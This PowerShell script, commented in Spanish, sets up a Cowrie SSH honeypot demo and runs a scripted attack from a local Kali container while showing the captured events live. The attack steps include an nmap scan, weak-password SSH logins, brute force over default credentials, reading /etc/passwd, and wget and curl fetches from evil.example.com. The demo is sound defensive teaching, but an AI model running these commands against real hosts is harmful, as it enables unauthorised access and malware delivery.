# =============================================================
#  Valhalla SOC - Honeypot - Ataque en vivo con tail de logs
#
#  Uso (desde la carpeta honeypot/):
#    powershell -ExecutionPolicy Bypass -File .\scripts\live_attack.ps1
#
#  Que hace:
#    1) Abre una ventana con el tail formateado de cowrie.json
#    2) En esta misma ventana lanza el ataque desde Kali paso a paso
#
#  NOTA: ASCII-only. Windows PS 5.x no lee UTF-8 sin BOM.
# =============================================================

$ErrorActionPreference = "Continue"
$HoneypotDir = Split-Path -Parent $PSScriptRoot
Set-Location $HoneypotDir
$LogFile = Join-Path $HoneypotDir "logs\cowrie.json"

# ----- helpers -----------------------------------------------
function Log  { param([string]$T) Write-Host $T -ForegroundColor Cyan }
function Info { param([string]$T) Write-Host $T -ForegroundColor Yellow }
function OK   { param([string]$T) Write-Host ("[OK] " + $T) -ForegroundColor Green }
function KO   { param([string]$T) Write-Host ("[!!] " + $T) -ForegroundColor Red }
function Sep  { Write-Host ("=" * 55) -ForegroundColor DarkGray }

function Get-CowrieIP {
    try {
        $raw = docker inspect valhalla-cowrie 2>&1 | Out-String
        $obj = $raw | ConvertFrom-Json
        return $obj[0].NetworkSettings.Networks.'valhalla-net'.IPAddress
    } catch { return $null }
}

function Run-Kali {
    param([string]$Cmd)
    $out = docker exec valhalla-attacker sh -c $Cmd 2>&1 | Out-String
    # Filtrar warnings de SSH que no son relevantes para la demo
    $lines = $out -split "`n" | Where-Object {
        $_ -notmatch "WARNING:|Permanently added|post-quantum|vulnerable|upgraded"
    }
    return ($lines -join "`n").Trim()
}

# ----- preflight ---------------------------------------------
Sep
Log " Valhalla SOC - Ataque en vivo"
Sep
Write-Host ""

# Docker
$dv = docker info --format "{{.ServerVersion}}" 2>&1
if ($dv -notmatch "^[0-9]") {
    KO "Docker Desktop no esta corriendo. Arrancalo y reintenta."
    exit 1
}
OK ("Docker v" + $dv)

# Cowrie
$cowriePsRaw = docker ps --filter name=valhalla-cowrie --format "{{.Names}}" 2>&1
if ($cowriePsRaw -notmatch "valhalla-cowrie") {
    Info "Cowrie no esta corriendo. Arrancando..."
    docker compose up -d | Out-Null
    Log "Esperando 40s a que Cowrie inicialice..."
    Start-Sleep -Seconds 40
}
OK "Cowrie corriendo"

# IP
$CowrieIP = Get-CowrieIP
if (-not $CowrieIP) { KO "No se pudo obtener IP de Cowrie en valhalla-net"; exit 1 }
OK ("Cowrie IP: " + $CowrieIP)

# Attacker
$attRunning = docker ps --filter name=valhalla-attacker --format "{{.Names}}" 2>&1
if ($attRunning -notmatch "valhalla-attacker") {
    Info "Levantando contenedor Kali..."
    $attExist = docker ps -a --filter name=valhalla-attacker --format "{{.Names}}" 2>&1
    if ($attExist -match "valhalla-attacker") {
        docker start valhalla-attacker | Out-Null
    } else {
        docker run -d --name valhalla-attacker --hostname attacker --network valhalla-net kalilinux/kali-rolling bash -c "tail -f /dev/null" | Out-Null
    }
    Start-Sleep -Seconds 3
}
try { docker network connect valhalla-net valhalla-attacker 2>&1 | Out-Null } catch {}
OK "Kali attacker listo"

# Herramientas en Kali
Info "Instalando herramientas en Kali (solo la primera vez)..."
docker exec valhalla-attacker apt-get update -qq 2>&1 | Out-Null
docker exec valhalla-attacker apt-get install -y -qq nmap openssh-client sshpass iputils-ping 2>&1 | Out-Null
OK "Herramientas listas (nmap, ssh, sshpass, ping)"

# Log file existe?
if (-not (Test-Path $LogFile)) {
    New-Item -Force -ItemType Directory -Path (Join-Path $HoneypotDir "logs") | Out-Null
    "" | Set-Content $LogFile
}

Write-Host ""
Sep

# ----- abrir ventana de tail en vivo -------------------------
$tailScript = @'
$LogFile = "LOGFILE_PLACEHOLDER"
$host.UI.RawUI.WindowTitle = "Cowrie LIVE - tail -f cowrie.json"
Write-Host ""
Write-Host " Cowrie - eventos en vivo (tail -f)" -ForegroundColor Magenta
Write-Host " Ctrl+C para cerrar esta ventana" -ForegroundColor DarkGray
Write-Host ("=" * 55) -ForegroundColor DarkGray
Write-Host ""
Get-Content -Wait -Tail 0 $LogFile | ForEach-Object {
    try {
        $e = $_ | ConvertFrom-Json
        $ts = $e.timestamp.Substring(11,8)
        switch -Wildcard ($e.eventid) {
            "cowrie.session.connect" {
                Write-Host ("[" + $ts + "] CONEXION      " + $e.src_ip) -ForegroundColor Cyan
            }
            "cowrie.login.success" {
                Write-Host ("[" + $ts + "] LOGIN OK      user=" + $e.username + "  pass=" + $e.password) -ForegroundColor Green
            }
            "cowrie.login.failed" {
                Write-Host ("[" + $ts + "] LOGIN FAIL    user=" + $e.username + "  pass=" + $e.password) -ForegroundColor Red
            }
            "cowrie.command.input" {
                Write-Host ("[" + $ts + "] COMANDO       " + $e.input) -ForegroundColor Yellow
            }
            "cowrie.session.closed" {
                Write-Host ("[" + $ts + "] SESION CIERRA duracion=" + $e.duration + "s") -ForegroundColor DarkGray
            }
            "cowrie.session.file_download" {
                Write-Host ("[" + $ts + "] DESCARGA      " + $e.url) -ForegroundColor Magenta
            }
            default {
                Write-Host ("[" + $ts + "] " + $e.eventid) -ForegroundColor DarkGray
            }
        }
    } catch {}
}
'@

$tailScript = $tailScript.Replace("LOGFILE_PLACEHOLDER", $LogFile.Replace("\","\\"))
$tailEncoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($tailScript))

Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $tailEncoded"
Start-Sleep -Seconds 1

# ----- ataque interactivo paso a paso ------------------------
Write-Host ""
Log " VENTANA DE LOGS ABIERTA - Mira la otra ventana mientras atacas"
Write-Host ""
Sep
Write-Host ""

$steps = @(
    @{ label = "Paso 1 - Ping al honeypot";              cmd = "ping -c 3 $CowrieIP" },
    @{ label = "Paso 2 - Escaneo de puertos (nmap)";     cmd = "nmap -p 2222,2223 $CowrieIP" },
    @{ label = "Paso 3 - Login debil (root/123456)";     cmd = "sshpass -p '123456' ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR root@$CowrieIP 'whoami; id; uname -a'" },
    @{ label = "Paso 4 - Comandos en shell falsa";        cmd = "sshpass -p '123456' ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR root@$CowrieIP 'ls /; cat /etc/passwd; cat /etc/hostname'" },
    @{ label = "Paso 5 - Descarga de malware simulada";  cmd = "sshpass -p '123456' ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR root@$CowrieIP 'wget http://evil.example.com/malware.sh; curl http://evil.example.com/bot.py'" },
    @{ label = "Paso 6 - Fuerza bruta (multiples creds)"; cmd = $null }
)

$brutePairs = @("admin:admin","ubuntu:ubuntu","pi:raspberry","root:toor","root:password","deploy:deploy")

foreach ($step in $steps) {
    Write-Host ""
    Info (">>> " + $step.label)
    Write-Host ""

    if ($step.cmd) {
        $out = Run-Kali $step.cmd
        Write-Host $out.Trim()
    } else {
        # fuerza bruta
        foreach ($pair in $brutePairs) {
            $u = $pair.Split(":")[0]; $p = $pair.Split(":")[1]
            $r = Run-Kali ("sshpass -p '" + $p + "' ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o NumberOfPasswordPrompts=1 -o LogLevel=ERROR " + $u + "@" + $CowrieIP + " 'echo LOGIN_OK' 2>&1")
            if ($r -match "LOGIN_OK") {
                Write-Host ("  [ACEPTADO]  " + $u + ":" + $p) -ForegroundColor Green
            } else {
                Write-Host ("  [RECHAZADO] " + $u + ":" + $p) -ForegroundColor Red
            }
            Start-Sleep -Milliseconds 400
        }
    }

    Start-Sleep -Seconds 2
}

# ----- resumen final -----------------------------------------
Write-Host ""
Sep
Write-Host ""
$totalEvents = (Get-Content $LogFile -ErrorAction SilentlyContinue | Measure-Object -Line).Lines
OK ("Ataque completado. Eventos registrados en cowrie.json: " + $totalEvents)
Write-Host ""
Log "Mira la ventana de logs para ver todo lo capturado."
Log "Para parar el honeypot: docker compose down"
Write-Host ""
